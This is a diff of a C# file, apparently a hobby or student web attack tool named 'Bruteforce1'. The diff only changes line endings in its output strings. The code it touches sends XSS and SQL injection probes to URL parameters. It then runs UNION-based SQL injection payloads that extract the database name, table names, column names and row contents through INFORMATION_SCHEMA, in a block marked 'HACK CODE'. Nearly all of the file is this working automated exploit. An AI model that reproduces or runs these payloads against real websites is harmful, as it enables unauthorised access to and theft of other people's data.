@@ -53,37 +53,37 @@ namespace Bruteforce1
 
             foreach (string p in urlParameters)
             {
-                output += "\n Testing Parameter" + i + " : " + p;
+                output += "\r\r\n Testing Parameter" + i + " : " + p;
                 //Run to test for XSS ability
-                output += "-------------XSS--------------\n";
+                output += "-------------XSS--------------\r\n";
                 phonyrequests[i] = url.Replace(p, p + "<xss>");
-                output += "Attempted to send: " + phonyrequests[i] + "\n \n";
+                output += "Attempted to send: " + phonyrequests[i] + "\r\n \r\n";
                 HttpWebRequest webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                 string response = "";
                 webRequest.Method = "GET";
                 reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                 response = reader.ReadToEnd();
-                output += "-------------XSS RESPONSE--------------\n";
+                output += "-------------XSS RESPONSE--------------\r\n";
                 if (response.Contains("<xss>"))
                 {
-                    output += "XSS vunrability in param " + p + "\n";
+                    output += "XSS vunrability in param " + p + "\r\n";
                 }
 
                 //Repeat for SQL injection
-                output += "-------------SQL--------------\n";
+                output += "-------------SQL--------------\r\n";
                 phonyrequests[i] = url.Replace(p, p + "badinfo;");
-                output += "\n Attempted to send: " + phonyrequests[i] + "\n \n";
+                output += "\r\n Attempted to send: " + phonyrequests[i] + "\r\n \r\n";
                 webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                 webRequest.Method = "GET";
                 response = "";
 
                 reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                 response = reader.ReadToEnd();
-                output += "\n-------------SQL RESPONSE--------------\n";
+                output += "\r\n-------------SQL RESPONSE--------------\r\n";
                 if (response.Contains("badinfo;"))
                 {
 
-                    output += "SQL injection vunrability in param " + p + "\n";
+                    output += "SQL injection vunrability in param " + p + "\r\n";
                     sQLValid = true;
 
                 }
@@ -93,14 +93,14 @@ namespace Bruteforce1
                 if (true)
                 {
 
-                    output += "\n-------------ATTEMPTING SQL INJECTION TO GET DATABASE NAME--------------\n";
-                    output += "\n" + p + " is parameter being infected\n";
+                    output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET DATABASE NAME--------------\r\n";
+                    output += "\r\n" + p + " is parameter being infected\r\n";
                     //phonyrequests[i] = url.Replace(p, p + "bad+info'+UNION+ALL+SELECT+NULL,NULL,CONCAT(0x6861636B,DATBASE(),0x6861636B),NULL#");
                     if (i == 0)
                     {
                         //Retreive Database Names
                         phonyrequests[i] = url.Replace(p, p + "info'+UNION+ALL+SELECT+CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack') %23");
-                        output += "\n sent " + phonyrequests[i];
+                        output += "\r\n sent " + phonyrequests[i];
                         MatchCollection matches;
                         Regex regexVar;
                         try
@@ -117,12 +117,12 @@ namespace Bruteforce1
                             {
                                 if (!databaseName.Equals(m.Groups[1].Value))
                                 {
-                                    output += "\nChanged dbname from " + databaseName + " to " + m.Groups[1].Value;
+                                    output += "\r\nChanged dbname from " + databaseName + " to " + m.Groups[1].Value;
                                     databaseName = m.Groups[1].Value;
                                 }
 
                             }
-                            output += "\n ----- DATABASE NAME IS :" + databaseName + "\n";
+                            output += "\r\n ----- DATABASE NAME IS :" + databaseName + "\r\n";
                         }
                         catch (Exception se)
                         {
@@ -131,9 +131,9 @@ namespace Bruteforce1
                         try
                         {
                             //Retreive Table Names
-                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE NAMES-------------\n";
+                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE NAMES-------------\r\n";
                             phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+TABLE_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_TYPE+%3D+%27BASE+TABLE%27+AND+TABLE_SCHEMA%3D %27" + databaseName + "%27%23");
-                            output += "\n sent :" + phonyrequests[i];
+                            output += "\r\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                             response = reader.ReadToEnd();
@@ -151,7 +151,7 @@ namespace Bruteforce1
                                 }
 
                             }
-                            output += "\n ----- TABLE NAME IS :" + tablename+ "\n";
+                            output += "\r\n ----- TABLE NAME IS :" + tablename+ "\r\n";
                         }
                         catch (Exception se)
                         {
@@ -160,9 +160,9 @@ namespace Bruteforce1
                         try
                         {
                             //Retreive Information Names
-                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S COLUMN-------------\n";
+                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S COLUMN-------------\r\n";
                             phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+COLUMN_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema%3D%27" + databaseName + "%27 %23");
-                            output += "\n sent :" + phonyrequests[i];
+                            output += "\r\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                             response = reader.ReadToEnd();
@@ -175,7 +175,7 @@ namespace Bruteforce1
                             {
                                 if (!"".Equals(m.Groups[1].Value))
                                 {
-                                    output += "\n Found Column Called [[[" + m.Groups[1].Value + "]]]\n";
+                                    output += "\r\n Found Column Called [[[" + m.Groups[1].Value + "]]]\r\n";
                                     varNames[x] = m.Groups[1].Value;
                                     x++;
                                 }
@@ -190,7 +190,7 @@ namespace Bruteforce1
                         try
                         {
                             //Display info on Each table
-                            output += "\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE Showing each value-------------\n";
+                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE Showing each value-------------\r\n";
                             String requestString = "";
                             int w = 0;
                             while (w < varNames.Length && w<3)
@@ -203,7 +203,7 @@ namespace Bruteforce1
                             }
                             requestString = requestString.Substring(0,requestString.Length-1);
                             phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+CONCAT('hack',"+requestString+",'hack'),NULL,NULL+FROM+"+tablename+"%23");
-                            output += "\n sent :" + phonyrequests[i];
+                            output += "\r\n sent :" + phonyrequests[i];
                             webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                             reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                             response = reader.ReadToEnd();
@@ -214,7 +214,7 @@ namespace Bruteforce1
                             {
                                 if (!"".Equals(m.Groups[1].Value))
                                 {
-                                    output += "\n Found Information Called [[[" + m.Groups[1].Value + "]]]\n";
+                                    output += "\r\n Found Information Called [[[" + m.Groups[1].Value + "]]]\r\n";
                                     databaseName = m.Groups[1].Value;
                                 }
 
@@ -229,7 +229,7 @@ namespace Bruteforce1
                     }
                     else
                     {
-                        output += "\n N0t first parameter\n";
+                        output += "\r\n N0t first parameter\r\n";
                     }
 
 
@@ -250,14 +250,14 @@ namespace Bruteforce1
                     }
                     else
                     {
-                        output=response +"Search is " + search + " \n";
+                        output=response +"Search is " + search + " \r\n";
                         label1.Text = output;
                         Update();
                         search = response.IndexOf('h', search);
                     }
 
                 }
-                output += "\n DATABASENAME : " + databaseName + "\n \n \n ";
+                output += "\r\n DATABASENAME : " + databaseName + "\r\n \r\n \r\n ";
                 */
                 //END HACK CODE
 
